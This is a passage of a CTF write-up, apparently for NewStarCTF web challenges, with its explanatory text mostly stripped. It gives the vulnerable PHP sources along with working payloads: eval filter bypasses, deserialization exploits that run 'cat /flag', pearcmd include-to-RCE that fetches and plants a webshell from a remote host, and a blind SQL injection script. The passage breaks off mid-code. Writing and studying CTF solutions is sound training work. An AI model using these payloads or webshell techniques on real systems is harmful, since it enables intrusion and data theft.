class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'e_v.a.l'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$password</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'e_v.a.l'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"c4d038"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//114514</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|pass|cat|ls/i"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><blockquote><p>**password&#x3D;114514&amp;e[v.a.l&#x3D;echo <code>more /fl??</code>;**<br><img src="https://img-blog.csdnimg.cn/9c50573ea17242a8a5b0d8ec5c77f872.png" alt="1"></p></blockquote><h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p><br>admin000000burp302flag<br><img src="https://img-blog.csdnimg.cn/b2b750f96f9645d28a39e9f346dfd175.png" alt="2"></p><h2 id="week2-web"><a href="#week2-web" class="headerlink" title="week2-web"></a>week2-web</h2><p></p><h3 id="Unserialize"><a href="#Unserialize" class="headerlink" title="Unserialize"></a>Unserialize</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Maybe you need learn some knowledge about deserialize?</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">evil</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token comment">//cmd</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/cat|tac|more|tail|base/i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            @<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'unser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>private%00()%00()protect%00*%00()</p></blockquote><p>exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">evil</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"nl /th1s_1s_fffflllll4444aaaggggg"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h3><p><code>.htaccess</code><br>.htaccess<br><img src="https://img-blog.csdnimg.cn/06c6774f41e748d3937afeb063413849.png" alt="123"></p><p><br><img src="https://img-blog.csdnimg.cn/d6feb5d5e82246a686a979196cfb1fcf.png" alt="123"><br></p><h3 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h3><p>.git<br><img src="https://img-blog.csdnimg.cn/94e16be6682f42139c3071d6964ebc59.png" alt="456"><br>bo0g1pop.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>if (&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;star&#39;]))</code>rce</p><blockquote><p>GET<br>star&#x3D;eval(next(getallheaders()));<br><img src="https://img-blog.csdnimg.cn/bffdd37418c0412c80b75fb545225002.png" alt="123"></p></blockquote><h2 id="week3-web"><a href="#week3-web" class="headerlink" title="week3-web"></a>week3-web</h2><h3 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h3><p>register_argc_argv</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|log|session|filter|input|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment"># Something in phpinfo.php!</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>phpinfo.php<br>flag<code>register_argc_argv</code><br><img src="https://img-blog.csdnimg.cn/b99c8a88c07a4e6286d25ca285e74158.png" alt="456"><br><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/">registerargcargvinclude to RCE</a></p><blockquote><p>&#x2F;&#x2F;webshell,burpsuitecurl&lt; ? &gt; <br>&#x2F;&#x2F; config-create&#x2F;<br><a href="http://ip:port/include.php?f=pearcmd&amp;+config-create+/">http://ip:port/include.php?f=pearcmd&amp;+config-create+/</a><?=phpinfo();?>+&#x2F;tmp&#x2F;evil.php<br>&#x2F;&#x2F; webshell<br>&#x2F;&#x2F; web</p><ul><li><a href="http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php">http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php</a></li><li><a href="http://ip:port/tmp/pear/download/evil.php">http://ip:port/tmp/pear/download/evil.php</a><br>&#x2F;&#x2F; tmp</li><li><a href="http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php">http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php</a></li><li><a href="http://ip:port/include.php?f=/tmp/pear/download/evil">http://ip:port/include.php?f=/tmp/pear/download/evil</a></li></ul></blockquote><p><img src="https://img-blog.csdnimg.cn/7d3cce3881de4f9a89bc8e659bf3f395.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/66e920198f60410f8ba08d44e18bb64f.png" alt="789"><br><code>/tmp/pear/download/1.php</code><br><img src="https://img-blog.csdnimg.cn/1daa56ab972347a98aa42ad9931a2d1a.png" alt="456"></p><h3 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h3><p>sql<br><img src="https://img-blog.csdnimg.cn/a6ea86a9c7d14d3d853ce0e18ea3c65f.png" alt="1"><br><br><br><code>1TMP3074&#39;Or 1=1 -- -</code><br><br>burp<br><img src="https://img-blog.csdnimg.cn/8bc362b3464d4e77a078e91c27a32ddf.png" alt="1"><br>order by5unionunion<br><br><code>?id=1TMP3074&#39; Or length(database()) &gt; 2--+</code><br><code>?id=1TMP3074&#39; Or length(database()) &gt; 3--+</code><br><br><code>?id=1TMP3074&#39;Or mid(database(),1,1)= &#39;b&#39; --</code><br>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://13d36774-d283-422c-98f2-9164d199a034.node4.buuoj.cn:81/?id=TMP0919'AND "</span>result <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Ascii(Substr((Select flag from here_is_flag),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">--+'</span></span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"points"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/18afb59598064b03b3ab0b7644b4a319.png" alt="1"></p><h2 id="week4-web"><a href="#week4-web" class="headerlink" title="week4-web"></a>week4-web</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bad"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"good"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">GetFlag</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">GetFlag</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>key</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bad"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"good"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">GetFlag</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'456789789'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">GetFlag</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//O:7:"GetFlag":2:&#123;s:3:"key";s:9:"456789789";s:3:"cmd";s:6:"whoami";&#125;n0rt6\86159</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>whoami</code><br><code>&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code>26<code>&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</code>29<br>wafbadgood<br>2929bad<code>&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</code><br>exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bad"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"good"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">GetFlag</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";&#125;'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">GetFlag</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/38746d4f57ca42c7934536d2694d8579.png" alt="123"></p><h3 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h3><p>GC</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$errMsg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">errMsg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Pwn</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Reverse</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Web</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Not Flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Crypto</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$wel</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token property">good</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"NewStar"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"good job but nothing"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fast'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token 